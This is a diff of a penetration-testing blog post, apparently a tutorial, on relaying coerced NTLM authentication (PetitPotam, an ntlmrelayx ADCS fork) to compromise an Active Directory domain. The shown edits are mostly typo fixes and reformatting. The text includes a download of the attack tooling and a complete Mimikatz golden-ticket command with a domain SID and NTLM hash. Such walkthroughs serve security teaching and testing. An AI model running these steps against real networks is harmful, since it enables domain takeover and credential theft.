@@ -10,7 +10,7 @@ typora-copy-images-to: ../images/posts/2020/${filename}/
 
 # Coerced NTLM relay attack using Petitpotam, Ntlmrelayx and Mimikatz
 
-There has been a lot of noise in the InfoSec community about this attacked, which links a coerced NTLM relay attack and a weakness in the default Active Directory Certificate Services configuration discovered by X that allows an attacker to compromise a domain. 
+There has been a lot of noise in the InfoSec community about this attacked, which links a coerced NTLM relay attack and a weakness in the default Active Directory Certificate Services configuration discovered by [SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2) that allows an attacker to compromise a domain. 
 
 ## Preparation
 
@@ -18,7 +18,7 @@ To begin with a number of tools are required which need to be downloaded as they
 
 ### PetitPotam
 
-This is the tool that allows you to coercre an authentication from a Windows host via via MS-EFSRPC. Coerac an authentication is nice as often you would need to have a Man in the Middle position to capture NTLM authentications for relay. No credentials are required.
+This is the tool that allows you to coercre an authentication from a Windows host via via MS-EFSRPC. Coerceing an authentication is nice as often you would need to have a Man in the Middle (MitM) position to capture NTLM authentications for relay. No credentials are required.
 
 More information can be found at https://github.com/topotam/PetitPotam
 
@@ -30,7 +30,7 @@ You will need to clone this repository to get the tool
 
 NTLMRekayx is part of [Impacket](https://github.com/SecureAuthCorp/impacket), a set of Python classes for working with network protocols. 
 
-The current master version of NTLMRelayx that will be present on Kali etc. does not have the ADCS relay functionality built in. This was developed by [ExAndroidDev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/), so you need to patch their pull request in or use their fork. The example below uses their fork.
+The current release version of NTLMRelayx that will be present on Kali etc. does not have the ADCS relay functionality built in. This was developed by [ExAndroidDev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/), so you need to patch their pull request in or use their fork. The example below uses their fork.
 
 ```bash
 wget https://github.com/ExAndroidDev/impacket/archive/refs/heads/ntlmrelayx-adcs-attack.zip
@@ -45,11 +45,11 @@ Virtualenv is used to create an isolated Python environment to install this fork
 
 ### Rubeus
 
-[Rubeus](https://github.com/GhostPack/Rubeus) is a Windows tool for using and abusing Kerberos. The code needs to be downloaded from the Github repository and then compiled. You can use [Visual Studio Community 2019](https://visualstudio.microsoft.com/vs/community/), which is free to do this.
+[Rubeus](https://github.com/GhostPack/Rubeus) is a Windows tool for using and abusing Kerberos. The code needs to be downloaded from the Github repository and then compiled. You can use [Visual Studio Community 2019](https://visualstudio.microsoft.com/vs/community/), which is free, to do this.
 
 ### Mimikatz
 
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) is the go-to tool for abusing Windows authentication, among other things. You can grab a compiled release from the Github repository, though it will need to be run on a system you control with the Antivirus switch off, as **everything** detects it as Malware in it's default state.
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) is the go-to tool for abusing Windows authentication, among other things. You can grab a compiled release from the Github repository, though it will need to be run on a system you control with the Antivirus switched off, as **everything** detects it as malware in it's default state.
 
 ## The attack
 
@@ -282,12 +282,14 @@ Supplemental Credentials:
 
 Next we can generate the golden ticket.
 
-In the command below the /user is the user we want to impersonate, in this case the default Domain Administrator account.
-/domain is the domain we want to operate against
-/sid: is the Object Security ID for the KRBTGT account that can be see above.
-/rc4: is the Hash NTLM from above
-/id: is the RID to impersonate. The built in administrator has the RID of 500
-/ptt means "pass the ticket" again and will put the Kerberos credential into our running session
+In the command below we have the arguments:
+
+-  */user* is the user we want to impersonate, in this case the default Domain Administrator account.
+- */domain* is the domain we want to operate against
+- */sid* is the Object Security ID for the KRBTGT account that can be see above.
+- */rc4* is the Hash NTLM from above
+- */id* is the RID to impersonate. The built in administrator has the RID of 500
+- */ptt* means "pass the ticket" again and will put the Kerberos credential into our running session
 
 ```
 mimikatz # kerberos::golden /user:administrator /domain:achilleantest.local /sid:S-1-5-21-3553360538-1659965901-2675215416 /rc4:756976f83b1b576290c91fbc331094e6 /id:500 /ptt
